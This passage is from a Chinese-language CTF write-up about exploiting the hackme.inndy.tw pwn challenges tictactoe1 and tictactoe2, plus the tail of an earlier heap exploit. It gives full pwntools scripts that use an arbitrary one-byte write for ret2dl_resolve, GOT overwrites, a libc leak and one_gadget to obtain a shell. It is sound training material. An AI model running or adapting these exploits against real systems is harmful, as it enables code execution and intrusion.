    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    def write(Length,Title,Content):
        ru("Action: ")
        sl("1")
        ru("Content Length: ")
        sl(str(Length))
        ru("Title: ")
        sl(Title)
        ru("Content: ")
        sl(Content)
    shellcode =asm(shellcraft.sh())#length is 44
    #print len(shellcode)
    write(32,shellcode.ljust(0x40,"\x00")+p32(0x70),"aaaa")
    write(32,"bbbb","bbbb"*8+p32(0)+p32(0xffffffff))
    #write(48,"cccc","cccc")
    sla(p,"Action: ","2")
    ru("\x71")
    leak_heap=u32(p.recv(7)[3:])
    shellcode_addr = leak_heap+4
    top = leak_heap+0xd8
    fake_size = elf.got["printf"] - top- 72-16
    print "shellcode address is : ",hex(shellcode_addr)
    print "top chunk address is : ",hex(top)
    print "fake size  is : ",hex(fake_size)
    print "fake size+top  = ",hex(fake_size+top)
    write(fake_size,'aaaa','bbbb')
    gdb.attach(p)
    pause()
    sla(p,'Action: ','1')
    sla(p,'Length: ','30')
    sla(p,'Title: ',p32(shellcode_addr))
    pause()
    getshell()
# tictactoe1、2
32位程序，开了canary，NX保护
tictactoe1和tictactoe2都是一样的题目，只是要求到的操作不一样，tictactoe1只需要得到flag_simple就行了，而tictactoe2需要搞到shell，才能得到进一步的flag
这里我就直接开始弄能拿到shell的操作
首先分析一波程序：
这其实是个井字棋游戏，只有赢了才能拿到flag，但实际上不可能赢，你最多做到平局
这时就需要通过找漏洞来操作了：
漏洞主要出在这里，v1可以输入为负数，从而导致可以任意地址写一个字节
这里就很容易想到，如果把puts的got表改成0x8048C46，也就是下图中的地址，即可拿到flag_simple
但是，我这里直接做getshell的操作，这实际上有两种getshell的方法
## 方法一
使用ret2dl_resolve的方法：
首先有一个for循环，最多进行九次，根据你选择的先手或者后手进行下棋，AI和用户交替下，通过check函数来判断棋局是否有结果，每一轮循环，会用取反来交替下棋
继续进入you_play函数分析：
如果用户输入9，那么可以改变下棋的占位字符（默认的是X），通过这个造成一个任意地址写，最多能达到9次的任意地址写
在main函数的最后：`memset(&player, 0, 0x18u);`
由此可以通过ret2dl_resolve的方法，把memset指向system，同时改player为$0，从而执行system（$0\x00）getshell，当然system（sh\x00）也行，我这里用$0
ret2dl_resolve的关键点在于第一次执行memset函数的时候，会通过DT_STRTAB找到函数名的字符串，从而确定函数的真正地址，如果通过操作使得memset在找函数名字符串的时候找到“system”,那么memset就好绑定位system的got表内容
从IDA中看：
STRTAB位于0x0804af58中
输入：readelf -a tictactoe1
得到 STRTAB为0x080482fb
进入gdb调试，可以观察STRTAB内容：
发现memset字符串的偏移是0x44
再寻找system字符串在程序中的位置，得到可伪造的STRTAB为0x8049fc8
这样一来思路就有了
首先通过任意地址写，将0x0804af58改为0x8049fc8，只需要改末两个字节，使得STRTAB被伪造
接着通过任意地址写，将player（0x804B048）改成$0参数
就可以getshell了
exp如下：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./tictactoe1"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    #libc = ELF("./libc-2.23.so")
    libc = elf.libc
    if sys.argv[1] == "r":
        p = remote("hackme.inndy.tw",7721)
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    def change(addr,value):
        offset = addr -0x804B056
        ru("\nInput move (9 to change flavor): ")
        sl("9")
        sd(value)
        ru("\nInput move (9 to change flavor): ")
        sd(str(offset))
    player= 0x0804B048#改为sh\x00,或者$0
    print "$0\x00".encode('hex')#73\x68\x00
    print "sh\x00".encode('hex')#\x24\x30\x00
    targe = 0x8049fc8#只需要修改后两个字节就行了
    STRTAB = 0x0804AF58
    bss = elf.bss()
    ru("Play (1)st or (2)nd? ")
    sl("1")
    change(player,'\x00')#0
    change(player,'\x24')#1 奇数轮次修改
    change(STRTAB,'\xc8')#2
    change(player + 1,'\x30')#3 奇数轮次修改
    change(STRTAB + 1,'\x9f')#4
    change(player+2,'\x00')#5 奇数轮次修改
    change(bss+0x100,'\x00')#6 后三轮无关紧主要是为了退出循环
    change(bss+0x100,'\x00')#7
    change(bss+0x100,'\x00')#8
    getshell()
这里需要注意的是，由于player每次会取反，改的时候需要注意统一用奇数轮次来写入
    for ( i = 0; i 
思路是这样的
  * 第1步、首先，第一次进入you_play的时候，你最多有三次任意写的机会，可以写三个字节，用这个把main末尾出的memset函数的got表改成``call you_play`的地址，从而实现了无限循环写
  * 第2步、接着改open_got的为：`0x08048Cb4:printf("Here is your flag: %s\n", buf);`，这样以来，程序执行到open函数的时候就会去执行这句，从而泄漏出buf的地址，进而得到libc偏移
  * 第3步、得到libc偏移后就能算出onegadget了，后面用于直接getshell
  * 第4步、这时再将exit的got改为`0x08048bd5:call you_play`,这么做的原因是，在执行完`0x08048Cb4:printf("Here is your flag: %s\n", buf);`后，将要执行exit(0)，从而使得程序重新变回无限循环写
  * 第5步、将check的关键变量`v1`改为-1，也就是0xffffffff，使得程序进入赢得游戏的if分支，从而执行之前第2、3、4步中的操作
  * 第6步、这时我们有了onegadget，程序通过第四步的构造，再一次执行到了you_play函数，继续构造写入，这时要把check的关键变量v1改为不等于-1，从而进入输掉游戏的if分支
  * 第7步、改open_got为 to ->call _exit 0x08048CF2 
  * 第8步、将exit的got改为onegadget
  * 第9步、将check的关键变量`v1`改为0xffffffff，跟第5步一样，使得程序进入赢得游戏的if分支，使得之前第7、8步的构造得以执行
  * 第10步、执行exit函数从而getshell
exp
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./tictactoe1"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    if sys.argv[1] == "r":
        p = remote("hackme.inndy.tw",7714)
        libc = ELF("./libc-2.23.so.i386")
    elif sys.argv[1] == "l":
        p = process(bin_elf)
        libc = elf.libc
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    def change(addr,value):
        offset = addr -0x804B056
        ru("\nInput move (9 to change flavor): ")
        sl("9")
        sd(value)
        ru("\nInput move (9 to change flavor): ")
        sd(str(offset))
        time.sleep(1)
        sys.stdout.flush()#每隔0.5秒刷新一次stdout
    memset_got = 0x0804B034
    open_got = 0x0804B02C
    exit_got = 0x0804B028
    check = 0x0804B04D
    ru("Play (1)st or (2)nd? ")
    sl("1")
    change(memset_got,'\xd5')# 将memset的got改为:0x08048bd5:call  you_play
    change(memset_got+1,'\x8b') 
    change(open_got,'\xb4')# 将open的got改为:0x08048Cb4:printf("Here is your flag: %s\n", buf);
    change(open_got+1,'\x8c')
    change(exit_got,'\xd5')# 将exit的got改为:0x08048bd5:call    you_play
    change(exit_got+1,'\x8b')
    #将v1改为-1,则可赢得游戏,开始执行向print flag的if分支
    change(check,"\xff")
    change(check+1,"\xff")
    change(check+2,"\xff")
    #leak libc_base
    offset =0x1462e#泄露的0xf7***f12到__libc_start_main的偏移
    ru("Here is your flag: ")
    libc_leak=u32(p.recv(4))
    print "libc_leak:",hex(libc_leak)
    __libc_start_main=libc_leak+offset
    print "__libc_start_main:",hex(__libc_start_main)
    libc_base=__libc_start_main-libc.sym["__libc_start_main"]
    print "libc_base:"+hex(libc_base)
    onegadget = libc_base+0x3AC69#远程端:0x3ac49,本地:0x5fbc5
    print "onegadget:",hex(onegadget)
    #输掉游戏,进入puts("Draw!......")的if分支
    change(check+1,"\x01")
    #改open_got为 to ->call  _exit 0x08048CF2 
    change(open_got,"\xf2")
    change(open_got+1,"\x8c")
    #将exit的got改为onegadget
    change(exit_got,p32(onegadget)[0])
    change(exit_got+1,p32(onegadget)[1])
    change(exit_got+2,p32(onegadget)[2])
    change(exit_got+3,p32(onegadget)[3])
    #赢得游戏,进入print flag的if分支
    change(check+1,"\xff")
    getshell()
这里需要注意的是，在泄漏libc那一步
泄漏出来的buf地址是一个这样的值：0xf7xxxf12，我是通过下断点进gdb调试，找到这个地址到`__libc_start_main`的偏移，从而得到`__libc_start_main`的真实地址，进而得到libc的基址
就这样算出onegadget
# 小结
通过这些题目，的确是让我学到了不少的骚操作，尤其是让我理解了调试的重要性，pwn题就是得慢慢看ida慢慢调试，加深自己对题目的理解，最后通过掌握的各个利用线索来getshell